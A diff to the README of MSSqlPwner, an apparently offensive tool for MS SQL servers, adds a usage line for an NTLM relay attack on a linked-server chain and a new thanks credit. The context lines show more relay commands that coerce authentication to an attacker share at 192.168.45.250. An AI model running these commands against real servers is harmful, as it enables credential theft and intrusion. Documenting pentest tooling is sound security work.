@@ -84,6 +84,9 @@ python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server 
 # Issuing NTLM relay attack on the SRV01 server
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 ntlm-relay \\\\192.168.45.250\\test
 
+# Issuing NTLM relay attack on chain ID 5
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 5 ntlm-relay \\\\192.168.45.250\\test
+
 # Issuing NTLM relay attack on the local server with custom command
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay \\\\192.168.45.250\\test
 
@@ -98,3 +101,4 @@ python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server 
 ## Thanks
 - [Kim Dvash](https://www.linkedin.com/in/kim-d-5b3114111) for designing this incredible logo.
 - [Pablo Martínez](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/) for the inspiration and the idea of the retrieving password technique.
+- [Omri Baso](https://www.linkedin.com/in/omri-baso-875aaa191/) for helping with inspiration and ideas.
